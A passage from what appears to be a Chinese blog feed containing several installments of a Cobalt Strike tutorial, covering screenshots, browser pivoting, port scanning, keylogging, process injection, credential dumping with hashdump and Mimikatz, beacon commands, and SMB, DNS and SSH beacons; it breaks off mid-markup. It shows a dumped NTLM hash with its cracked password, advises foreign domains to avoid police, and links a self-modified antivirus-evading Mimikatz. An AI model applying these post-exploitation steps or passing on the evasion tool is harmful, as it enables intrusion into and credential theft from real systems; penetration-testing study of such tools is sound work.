        <content type="html"><![CDATA[<h2 id="0x01-截图"><a href="#0x01-截图" class="headerlink" title="0x01-截图"></a>0x01-截图</h2><p>选择一个beacon，右键，目标–&gt;屏幕截图<br><a href="https://imgchr.com/i/elz5wD"><img src="https://s2.ax1x.com/2019/07/28/elz5wD.png" alt="elz5wD.png"></a><br>然后点击菜单栏上的“屏幕截图”按钮，如图，成功查看到截图<br><a href="https://imgchr.com/i/elz7Yd"><img src="https://s2.ax1x.com/2019/07/28/elz7Yd.png" alt="elz7Yd.png"></a></p><h2 id="0x02-浏览器代理"><a href="#0x02-浏览器代理" class="headerlink" title="0x02-浏览器代理"></a>0x02-浏览器代理</h2><p>选择一个beacon，右键，目标–&gt;浏览器代理<br><a href="https://imgchr.com/i/elzITe"><img src="https://s2.ax1x.com/2019/07/28/elzITe.png" alt="elzITe.png"></a><br>配置好相关的端口信息后，点击开始，即可使用目标机的指定端口作为浏览器代理<br><a href="https://imgchr.com/i/elzTFH"><img src="https://s2.ax1x.com/2019/07/28/elzTFH.png" alt="elzTFH.png"></a><br>随后cobaltstrike就会注入浏览器代理dll到进程中，我们通过配置我们服务器的IP,端口（本例中为123.207.x&#x2F;x），即可使用目标机作为浏览器代理<br><a href="https://imgchr.com/i/elz4eO"><img src="https://s2.ax1x.com/2019/07/28/elz4eO.png" alt="elz4eO.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(七)端口扫描与Net View</title>
      <link href="/2019/06/15/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B8%83-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E4%B8%8ENet-View/"/>
      <url>/2019/06/15/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B8%83-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E4%B8%8ENet-View/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01-端口扫描"></a>0x01-端口扫描</h2><p><a href="https://imgchr.com/i/elXh5R"><img src="https://s2.ax1x.com/2019/07/28/elXh5R.png" alt="elXh5R.png"></a></p><p>右键一个beacon，选择目标–&gt;端口扫描</p><p>或在beacon中使用命令portscan [ip] 命令</p><p>随后Cobaltstrike会自动识别目标机所在的内网ip段，可选择ARP，ICMP，none三种方式进行扫描，ports中填入你要扫描的端口</p><p><a href="https://imgchr.com/i/elXWVJ"><img src="https://s2.ax1x.com/2019/07/28/elXWVJ.png" alt="elXWVJ.png"></a><br>扫描后的结果，会在beacon中输出，或可在目标视图中查看到<br><a href="https://imgchr.com/i/elXo26"><img src="https://s2.ax1x.com/2019/07/28/elXo26.png" alt="elXo26.png"></a></p><h2 id="0x02-Net-view"><a href="#0x02-Net-view" class="headerlink" title="0x02-Net view"></a>0x02-Net view</h2><p>选择一个beacon，右键，目标–&gt;Net View,或在beacon中使用命令net view</p><p><a href="https://imgchr.com/i/elXI8x"><img src="https://s2.ax1x.com/2019/07/28/elXI8x.png" alt="elXI8x.png"></a></p><p>如图，beacon中输出了net view的信息</p><p><a href="https://imgchr.com/i/elXfa9"><img src="https://s2.ax1x.com/2019/07/28/elXfa9.png" alt="elXfa9.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(六)文件/进程管理与键盘记录</title>
      <link href="/2019/06/12/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%85%AD-%E6%96%87%E4%BB%B6-%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E4%B8%8E%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/06/12/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%85%AD-%E6%96%87%E4%BB%B6-%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E4%B8%8E%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-文件管理"><a href="#0x01-文件管理" class="headerlink" title="0x01-文件管理"></a>0x01-文件管理</h2><h3 id="①基础管理"><a href="#①基础管理" class="headerlink" title="①基础管理"></a>①基础管理</h3><p>选择一个会话，右键，目标–&gt;文件管理<br><a href="https://imgchr.com/i/eM8fu8"><img src="https://s2.ax1x.com/2019/07/27/eM8fu8.png" alt="eM8fu8.png"></a><br>Upload为上传一个文件 ，Make Directory为创建文件夹，List Drives为列出盘符，refresh为刷新，这块很简单，就不一一讲了。<br><a href="https://imgchr.com/i/eM8Rjf"><img src="https://s2.ax1x.com/2019/07/27/eM8Rjf.png" alt="eM8Rjf.png"></a></p><h3 id="②下载文件"><a href="#②下载文件" class="headerlink" title="②下载文件"></a>②下载文件</h3><p>需要使用文件管理功能，然后右键download<br><a href="https://imgchr.com/i/eM8c9I"><img src="https://s2.ax1x.com/2019/07/27/eM8c9I.png" alt="eM8c9I.png"></a><br>再点击菜单栏上方的文件下载按钮<br><a href="https://imgchr.com/i/eM8y4A"><img src="https://s2.ax1x.com/2019/07/27/eM8y4A.png" alt="eM8y4A.png"></a><br>点击sync files，配置保存路径即可下载文件</p><h3 id="③执行或删除文件"><a href="#③执行或删除文件" class="headerlink" title="③执行或删除文件"></a>③执行或删除文件</h3><p><a href="https://imgchr.com/i/eM82gP"><img src="https://s2.ax1x.com/2019/07/27/eM82gP.png" alt="eM82gP.png"></a><br>执行文件点击execute后会弹出一个窗口，要求你输入要执行程序的参数，这边按你的要求填写就行，不需要参数的话就不填。<br><a href="https://imgchr.com/i/eM8g3t"><img src="https://s2.ax1x.com/2019/07/27/eM8g3t.png" alt="eM8g3t.png"></a></p><h2 id="0x02-进程管理"><a href="#0x02-进程管理" class="headerlink" title="0x02-进程管理"></a>0x02-进程管理</h2><h3 id="①进入进程管理"><a href="#①进入进程管理" class="headerlink" title="①进入进程管理"></a>①进入进程管理</h3><p>选择一个beacon，右键，目标–&gt;进程列表<br><a href="https://imgchr.com/i/eM8HCn"><img src="https://s2.ax1x.com/2019/07/27/eM8HCn.png" alt="eM8HCn.png"></a><br>进程列表中 ，kill为关闭程序，refresh为刷新进程列表，inject则是把beacon注入进程，Log Keystrokes为键盘记录，Stea Token为窃取运行指定程序的用户令牌<br><a href="https://imgchr.com/i/eM8hDS"><img src="https://s2.ax1x.com/2019/07/27/eM8hDS.png" alt="eM8hDS.png"></a><br>简单的功能就不讲了，这边讲一下进程注入(inject)，键盘记录(Log Keystrokes)。</p><h3 id="②进程注入"><a href="#②进程注入" class="headerlink" title="②进程注入"></a>②进程注入</h3><p>该功能可以把你的beacon会话注入到另外一个程序之中，注入后，及时你原来的后门进程被关闭，你依然可以手握目标机的权限<br><a href="https://imgchr.com/i/eM84Hg"><img src="https://s2.ax1x.com/2019/07/27/eM84Hg.png" alt="eM84Hg.png"></a><br>选择进程，点击inject，随后选择监听器，点击choose，即可发现Cobaltstrike弹回了目标机的一个新会话，这个会话就是成功注入到某进程的beacon</p><h3 id="③键盘记录"><a href="#③键盘记录" class="headerlink" title="③键盘记录"></a>③键盘记录</h3><p>选择好进程后(可ctrl多选)，点击Log Keystrokes，然后再点击菜单栏上的“键盘记录”按钮<br><a href="https://imgchr.com/i/eM8IEQ"><img src="https://s2.ax1x.com/2019/07/27/eM8IEQ.png" alt="eM8IEQ.png"></a></p><p>如图，成功get到目标机的键盘记录</p><p><a href="https://imgchr.com/i/eM8oNj"><img src="https://s2.ax1x.com/2019/07/27/eM8oNj.png" alt="eM8oNj.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(五)凭据导出</title>
      <link href="/2019/06/11/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%BA%94-%E5%87%AD%E6%8D%AE%E5%AF%BC%E5%87%BA/"/>
      <url>/2019/06/11/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%BA%94-%E5%87%AD%E6%8D%AE%E5%AF%BC%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-凭据导出"><a href="#0x01-凭据导出" class="headerlink" title="0x01-凭据导出"></a>0x01-凭据导出</h2><p>凭据说的通俗易懂一点，可以理解为目标机的账号，密码<br>凭据导出是渗透测试中即为重要的步骤，导出目标机凭据后，我们可以使用凭据实现横向移动（利用hash传递，smb&#x2F;rdp爆破等等手法）来扩大我们的战果</p><h2 id="0x02-Hashdump导出hash"><a href="#0x02-Hashdump导出hash" class="headerlink" title="0x02-Hashdump导出hash"></a>0x02-Hashdump导出hash</h2><p><a href="https://imgchr.com/i/eMeKdP"><img src="https://s2.ax1x.com/2019/07/27/eMeKdP.png" alt="eMeKdP.png"></a><br>选择beacon会话右键,选择执行–&gt;转储Hash，或在beacon中输入hashdump<br>如图beacon会话框输出了目标机的用户名和密码hash值<br>以本次导出的一个凭据为例</p><pre><code>admin:1022:aad3b435b51404eeaad3b435b51404ee:f4bb18c1165a89248f9e853b269a8995:::</code></pre><p>f4bb18c1165a89248f9e853b269a8995为admin用户的NTLM Hash<br>我们可以去cmd5等平台破解该NTLM密文，如图，破解后明文为Abc123<br><a href="https://imgchr.com/i/eMe1JS"><img src="https://s2.ax1x.com/2019/07/27/eMe1JS.png" alt="eMe1JS.png"></a></p><h2 id="0x003-Mimikatz导出凭据"><a href="#0x003-Mimikatz导出凭据" class="headerlink" title="0x003-Mimikatz导出凭据"></a>0x003-Mimikatz导出凭据</h2><p><a href="https://imgchr.com/i/eMeuZt"><img src="https://s2.ax1x.com/2019/07/27/eMeuZt.png" alt="eMeuZt.png"></a></p><p>选择执行–&gt;Run Mimikatz，或在beacon中执行logonpasswords命令当会话为管理员权限时，才能dump成功，如果权限很低，请先提权~我日后也会写</p><p>如图，成功导出了登陆过3389的某用户的明文密码</p><p><a href="https://imgchr.com/i/eMedoV"><img src="https://s2.ax1x.com/2019/07/27/eMedoV.png" alt="eMedoV.png"></a></p><h2 id="0x04–凭据存储"><a href="#0x04–凭据存储" class="headerlink" title="0x04–凭据存储"></a>0x04–凭据存储</h2><p>如图，点击按钮，即可查看之前dump过的凭据信息<br><a href="https://imgchr.com/i/eMe8zQ"><img src="https://s2.ax1x.com/2019/07/27/eMe8zQ.png" alt="eMe8zQ.png"></a><br>在进行横向移动时也可以使用之前dump过的凭据<br><a href="https://imgchr.com/i/eMe3Rg"><img src="https://s2.ax1x.com/2019/07/27/eMe3Rg.png" alt="eMe3Rg.png"></a></p><h2 id="0x05-大福利"><a href="#0x05-大福利" class="headerlink" title="0x05-大福利"></a>0x05-大福利</h2><p>什么?你的mimikatz被杀了？加载不出来？？<br><a href="https://imgchr.com/i/eMeMIf"><img src="https://s2.ax1x.com/2019/07/27/eMeMIf.png" alt="eMeMIf.png"></a><br>今天为博客朋友们免费送上自改免杀版mimikatz，支持Windows10，编译时默认功能为logonpasswords</p><p><a href="https://imgchr.com/i/eMeJMj"><img src="https://s2.ax1x.com/2019/07/27/eMeJMj.png" alt="eMeJMj.png"></a><br>链接：<a href="https://pan.baidu.com/s/183BozwOrNNKurWOB-Gw74A">https://pan.baidu.com/s/183BozwOrNNKurWOB-Gw74A</a><br>提取码：3k84</p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(四)菜单栏与视图</title>
      <link href="/2019/06/10/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%9B%9B-%E8%8F%9C%E5%8D%95%E6%A0%8F%E4%B8%8E%E8%A7%86%E5%9B%BE/"/>
      <url>/2019/06/10/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%9B%9B-%E8%8F%9C%E5%8D%95%E6%A0%8F%E4%B8%8E%E8%A7%86%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Cobaltstrike菜单栏"><a href="#0x01-Cobaltstrike菜单栏" class="headerlink" title="0x01-Cobaltstrike菜单栏"></a>0x01-Cobaltstrike菜单栏</h2><p><a href="https://imgchr.com/i/eKTD29"><img src="https://s2.ax1x.com/2019/07/27/eKTD29.png" alt="eKTD29.png"></a></p><pre><code>1.新建连接2.断开当前连接3.监听器4.改变视图为Pivot Graph(可以显示各个目标的关系)5.改变视图为Session Table(会话列表)6.改变视图为Target Table(目标列表)7.查看凭据信息8.查看文件下载9.查看键盘记录10.查看屏幕截图11.生成无状态Beacon后门12.java自签名程序攻击13.生成office宏后门14.生成脚本通过web传递(利用powershell，bitsadmin，regsvr32生成会话)15.在Cobalt Strike的web服务上托管一个文件(提供一个文件下载)16.管理Cobalt Strike上运行的web服务17.帮助18.关于</code></pre><h2 id="0x02-Cobaltstrike视图"><a href="#0x02-Cobaltstrike视图" class="headerlink" title="0x02-Cobaltstrike视图"></a>0x02-Cobaltstrike视图</h2><h3 id="①菜单4-Pivot-Graph-拓扑图"><a href="#①菜单4-Pivot-Graph-拓扑图" class="headerlink" title="①菜单4:Pivot Graph(拓扑图)"></a>①菜单4:Pivot Graph(拓扑图)</h3><p>如图所示，该视图可以很清楚地查看各主机之间的关系，该视图在大规模内网渗透和APT中非常直观和实用。<br><a href="https://imgchr.com/i/eKTcb6"><img src="https://s2.ax1x.com/2019/07/27/eKTcb6.png" alt="eKTcb6.png"></a></p><h3 id="②菜单5-Session-Table-会话列表"><a href="#②菜单5-Session-Table-会话列表" class="headerlink" title="②菜单5:Session Table(会话列表)"></a>②菜单5:Session Table(会话列表)</h3><p>这个视图是我们渗透测试中最为常用的，他主要显示的是当前所有的会话，会话的权限，会话运行在目标机上的pid等等<br>选择会话右键，会出现很多功能</p><pre><code>进入beacon执行        dump hashes 获取hash        Elevate  提权        Golden Ticket 生成黄金票据注入当前会话        MAke token  凭证转换        Run Mimikatz 运行 Mimikatz         Spawn As 用其他用户生成Cobalt Strike侦听器目标        Browser Pivot 劫持目标浏览器进程        Desktop(VNC)  桌面交互        File Browser  文件浏览器        Net View 命令Net View        Port scan 端口扫描        Process list 进程列表        Screenshot 截图中转        SOCKS Server 代理服务        Listener  反向端口转发        Deploy VPN 部署VPNSpawn  新的通讯模式并生成会话Session 会话管理，删除，心跳时间，退出，备注</code></pre><p><a href="https://imgchr.com/i/eKTyK1"><img src="https://s2.ax1x.com/2019/07/27/eKTyK1.png" alt="eKTyK1.png"></a></p><h3 id="③菜单6-Target-Table-目标列表"><a href="#③菜单6-Target-Table-目标列表" class="headerlink" title="③菜单6:Target Table(目标列表)"></a>③菜单6:Target Table(目标列表)</h3><p>  本处显示的是在beacon中执行主机存活扫描&#x2F;端口扫描后，探测出的存活的主机。<br><a href="https://imgchr.com/i/eKT6Dx"><img src="https://s2.ax1x.com/2019/07/27/eKT6Dx.png" alt="eKT6Dx.png"></a></p><p>  在本视图中，选择目标右键<br><a href="https://imgchr.com/i/eKTrvR"><img src="https://s2.ax1x.com/2019/07/27/eKTrvR.png" alt="eKTrvR.png"></a></p><p>   如图，cs可以使用多种方式登录到目标主机（进行内网横向移动），如果多台服务器使用了同样的凭据，我们就可以使用此功能进行hash传递，拿下多台服务器权限<br>当然，其也带有端口扫描功能，可以扫描指定主机的端口。</p><p><a href="https://imgchr.com/i/eKT2VK"><img src="https://s2.ax1x.com/2019/07/27/eKT2VK.png" alt="eKT2VK.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(三)beacon详解</title>
      <link href="/2019/06/09/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B8%89-beacon%E8%AF%A6%E8%A7%A3/"/>
      <url>/2019/06/09/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B8%89-beacon%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Beacon详解"><a href="#0x01-Beacon详解" class="headerlink" title="0x01-Beacon详解"></a>0x01-Beacon详解</h2><h3 id="1-Beacon命令"><a href="#1-Beacon命令" class="headerlink" title="1.Beacon命令"></a>1.Beacon命令</h3><p>大家通过系列教程(二)的学习，配置好Listner，让目标机执行我们的Payload&#x2F;后门程序后，即可发现目标机已经上线<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZqk8%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZqk8.png" alt="eKZqk8.png"></a><br>右键目标interact来使用Beacon，我们用它来执行各种命令<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZOfg%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZOfg.png" alt="eKZOfg.png"></a></p><p>※在Cobalt Strike中它的心跳默认是60s(即sleep时间为60s，每一分钟目标主机与teamserver通信一次)， 这会让我们执行命令或进行其他操作响应很慢。。。<br>我刚开始没设置sleep时间甚至以为是cobaltstrike坏了–||。如果sleep时间过长，在下载文件面前更为明显，所以在测试时会把时间降低一点 。所以拿到beacon我一般先执行sleep 5，大家可以根据实战环境来调节，建议不要太快，不然流量会很明显。<br><img src="https://s2.ax1x.com/2019/07/27/eKmbRg.png" alt="eKmbRg.png"><br>※注意：beacon中不能直接输入cmd命令，比如要让目标机执行ipconfig这条cmd命令，对应的beacon命令是shell ipconfig,新人不要在这里踩坑哈<br>其他的beacon命令，大家可以在beacon中输入help来获取~<br>我在这贴出一部分汉化的命令</p><pre><code>Beacon Commands    Command                   Description    -------                   -----------    browserpivot              注入受害者浏览器进程    bypassuac                 绕过UAC    cancel                    取消正在进行的下载    cd                        切换目录    checkin                   强制让被控端回连一次    clear                     清除beacon内部的任务队列    connect                   Connect to a Beacon peer over TCP    covertvpn                 部署Covert VPN客户端    cp                        复制文件    dcsync                    从DC中提取密码哈希    desktop                   远程VNC    dllinject                 反射DLL注入进程    dllload                   使用LoadLibrary将DLL加载到进程中    download                  下载文件    downloads                 列出正在进行的文件下载    drives                    列出目标盘符    elevate                   尝试提权    execute                   在目标上执行程序(无输出)    execute-assembly          在目标上内存中执行本地.NET程序    exit                      退出beacon    getprivs                  Enable system privileges on current token    getsystem                 尝试获取SYSTEM权限    getuid                    获取用户ID    hashdump                  转储密码哈希值    help                      帮助    inject                    在特定进程中生成会话    jobkill                   杀死一个后台任务    jobs                      列出后台任务    kerberos_ccache_use       从ccache文件中导入票据应用于此会话    kerberos_ticket_purge     清除当前会话的票据    kerberos_ticket_use       从ticket文件中导入票据应用于此会话    keylogger                 键盘记录    kill                      结束进程    link                      Connect to a Beacon peer over a named pipe    logonpasswords            使用mimikatz转储凭据和哈希值    ls                        列出文件    make_token                创建令牌以传递凭据    mimikatz                  运行mimikatz    mkdir                     创建一个目录    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)    mode http                 使用HTTP作为通信通道    mv                        移动文件    net                       net命令    note                      备注           portscan                  进行端口扫描    powerpick                 通过Unmanaged PowerShell执行命令    powershell                通过powershell.exe执行命令    powershell-import         导入powershell脚本    ppid                      Set parent PID for spawned post-ex jobs    ps                        显示进程列表    p**ec                    Use a service to spawn a session on a host    p**ec_psh                Use PowerShell to spawn a session on a host    psinject                  在特定进程中执行PowerShell命令    pth                       使用Mimikatz进行传递哈希    pwd                       当前目录位置    reg                       Query the registry    rev2self                  恢复原始令牌    rm                        删除文件或文件夹    rportfwd                  端口转发    run                       在目标上执行程序(返回输出)    runas                     以另一个用户权限执行程序    runasadmin                在高权限下执行程序    runu                      Execute a program under another PID    screenshot                屏幕截图    setenv                    设置环境变量    shell                     cmd执行命令    shinject                  将shellcode注入进程    shspawn                   生成进程并将shellcode注入其中    sleep                     设置睡眠延迟时间    socks                     启动SOCKS4代理    socks stop                停止SOCKS4    spawn                     Spawn a session     spawnas                   Spawn a session as another user    spawnto                   Set executable to spawn processes into    spawnu                    Spawn a session under another PID    ssh                       使用ssh连接远程主机    ssh-key                   使用密钥连接远程主机    steal_token               从进程中窃取令牌    timestomp                 将一个文件时间戳应用到另一个文件    unlink                    Disconnect from parent Beacon    upload                    上传文件    wdigest                   使用mimikatz转储明文凭据    winrm                     使用WinRM在主机上生成会话    wmi                       使用WMI在主机上生成会话    argue                      进程参数欺骗</code></pre><h3 id="2-多种beacon"><a href="#2-多种beacon" class="headerlink" title="2.多种beacon"></a>2.多种beacon</h3><p>以下beacon使用前均需要开启对应的Listener，Listener如何开启请看上一节</p><h3 id="①http-beacon-amp-tcp-beacon"><a href="#①http-beacon-amp-tcp-beacon" class="headerlink" title="①http beacon&amp;tcp beacon"></a>①http beacon&amp;tcp beacon</h3><p>这两种beacon都是比较普通的，个人感觉讲解的意义不是很大。只不过是主机与teamserver的通信协议不同而已。<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZHTf%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZHTf.png" alt="eKZHTf.png"></a></p><h3 id="②SMB-beacon"><a href="#②SMB-beacon" class="headerlink" title="②SMB beacon"></a>②SMB beacon</h3><h4 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h4><p>官网介绍:SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。<br>因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效。<br>这张图很好的诠释了SMB beacon的工作流程<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZLtS%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZLtS.png" alt="eKZLtS.png"></a></p><h4 id="②smb-beacon使用"><a href="#②smb-beacon使用" class="headerlink" title="②smb beacon使用"></a>②smb beacon使用</h4><p>※这种beacon要求具有SMB Beacon的主机必须接受端口445上的连接.<br>派生一个SMB Beacon方法：在Listner生成SMB Beacon&gt;目标主机&gt;右键&gt; spawn as&gt;选中对应的Listener&gt;上线<br>或在beacon中使用命令spawn smb（smb为我的smb listener名字）<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZjpQ%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZjpQ.png" alt="eKZjpQ.png"></a><br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZvlj%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZvlj.png" alt="eKZvlj.png"></a></p><p>运行成功后外部可以看到∞∞这个字符，这就是派生的SMB Beacon。<br>当前是连接状态，你可以Beacon上用link <ip>命令链接他或者unlink <ip>命令断开它。<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZx6s%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZx6s.png" alt="eKZx6s.png"></a></p><p>这种beacon在内网横向渗透中运用的很多，横向渗透留到日后再讲。在内网环境中可以使用ipc $生成的SMB Beacon上传到目标主机执行，但是目标主机并不会直接上线的，需要我们自己用链接命令(link <ip>)去连接他。 </p><h3 id="③DNS-Beacon"><a href="#③DNS-Beacon" class="headerlink" title="③DNS Beacon"></a>③DNS Beacon</h3><p>DNS Beacon 在绕过防火墙 权限维持上非常有效，DNS beacon 可谓是是最受欢迎的Cobalt Strike功能之一。 官网给出的原理示意图如下<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZ70P%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZ70P.png" alt="eKZ70P.png"></a><br>使用DNS Beacon首先的有一个域名，域名建议用国外的，省去一些不必要的麻烦，也防止被查水表。。。域名使用一些通用平常的即可，整个配置过程配置非常简单一条A记录和几条NS记录即可</p><p>首先进入到域名管理界面（自己的域名过期了，用一下404师傅的图）<br>配置A记录指向服务器ip –&gt;ns记录都指向A记录域名<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZ56A%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZ56A.png" alt="eKZ56A.png"></a></p><p>配置好了我们可以用 nslookup 或者 dig +trace 来测试下 是否成功<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZ4ld%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZ4ld.png" alt="eKZ4ld.png"></a><br>如果返回的IP地址与你的服务器ip地址对应是正确的，那我们就可以开始配置dns beacon的监听器了<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKuqDs%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKuqDs.png" alt="eKuqDs.png"></a></p><p>Host那里最好填域名（A记录解析那个），不要填服务器的ip地址<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZhSH%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZhSH.png" alt="eKZhSH.png"></a><br>然后确定填上ns记录 英文逗号隔开 ，然后生成后门测试效果<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKubuj%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKubuj.png" alt="eKubuj.png"></a><br>这是主机栏上出现了一个黑屏的logo，经过一段时间的等待，目标主机即可上线。</p><h3 id="④SSH-beacon"><a href="#④SSH-beacon" class="headerlink" title="④SSH beacon"></a>④SSH beacon</h3><p>当内网有Linux时Cobalt Strike也是考虑到的提供了ssh连接，大家可以通过metasploit爆破内网的ssh账号密码，然后用目标机的beacon去连接就可以了。<br>目前有两种SSH Beacon连接方法<br><strong>1.密码直接连接</strong><br>Beacon命令: ssh [target:port] [user] [pass]<br><strong>2.ssh密匙连接</strong><br>ssh [target:port] [user] [&#x2F;path&#x2F;to&#x2F;key.pem]<br>链接成功后，如图会出现一个子beacon<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZIOI%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZIOI.png" alt="eKZIOI.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(二)Listner与Payload生成</title>
      <link href="/2019/06/08/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%BA%8C-Listner%E4%B8%8EPayload%E7%94%9F%E6%88%90/"/>
      <url>/2019/06/08/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%BA%8C-Listner%E4%B8%8EPayload%E7%94%9F%E6%88%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00-前言"></a>0x00-前言</h2><p>PS:原本想完成日更目标的，但昨天在研究无线，就没更，今天加班~<br><img src="https://s2.ax1x.com/2019/07/27/euTJyt.png" alt="euTJyt.png"></p><h2 id="0x01-Listner-监听器-介绍"><a href="#0x01-Listner-监听器-介绍" class="headerlink" title="0x01-Listner(监听器)介绍"></a>0x01-Listner(监听器)介绍</h2><h3 id="①Cobaltstrike-listner简介"><a href="#①Cobaltstrike-listner简介" class="headerlink" title="①Cobaltstrike listner简介"></a>①Cobaltstrike listner简介</h3><p>可能有一些小白并不理解什么叫做listner，在此科普一下。<br>Listner(监听器):专门用于对其他对象身上发生的事件或状态改变进行监听和相应处理的对象,当被监视的对象发生情况时,立即采取相应的行动。<br>在许多的渗透测试工具中，例如empire，metasploit，cobaltstrike中都有listner的存在。大家可以简单地理解为listner就是用来接收目标主机权限的模块。<br><img src="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211220201742456-2098877481.png" alt="image"></p><p>创建Listener的步骤：Cobaltstrike–&gt;监听器<br>目前我是用的是Cobaltstrike3.13版本，其中内置了九个Listener<br><a href="https://imgchr.com/i/euT8SA"><img src="https://s2.ax1x.com/2019/07/27/euT8SA.png" alt="euT8SA.png"></a></p><pre><code>windows/beacon_dns/reverse_dns_txtwindows/beacon_dns/reverse_httpwindows/beacon_tcp/bind_tcpwindows/beacon_http/reverse_httpwindows/beacon_https/reverse_httpswindows/beacon_smb/bind_pipe windows/foreign/reverse_http windows/foreign/reverse_https windows/foreign/reverse_tcp</code></pre><p>beacon为cs内置监听器,也就是说,当我们在目标系统成功执行payload以后,会弹回一个beacon的shell给cs<br>foreign主要是提供给外部使用的一些监听器,比如你想利用cs派生一个meterpreter或者armitage的shell回来,来继续后面的内网渗透,这时就选择使用外部监听器<br>至于如何实现Cobaltstrike与MSF和Armitage的联动，我们日后再讲。</p><h3 id="②listener的配置"><a href="#②listener的配置" class="headerlink" title="②listener的配置"></a>②listener的配置</h3><p>选择Cobaltstrike–&gt;监听器<br>随后输入Listener名字并选择你要使用的Listner类型，配置好外网IP和端口(不能冲突)点击save即可保存。在以后生成Payload的过程中即可使用该监听器。<br><a href="https://imgchr.com/i/euTZsx"><img src="https://s2.ax1x.com/2019/07/27/euTZsx.png" alt="euTZsx.png"></a></p><h2 id="0x002-Cobaltstrike生成后门"><a href="#0x002-Cobaltstrike生成后门" class="headerlink" 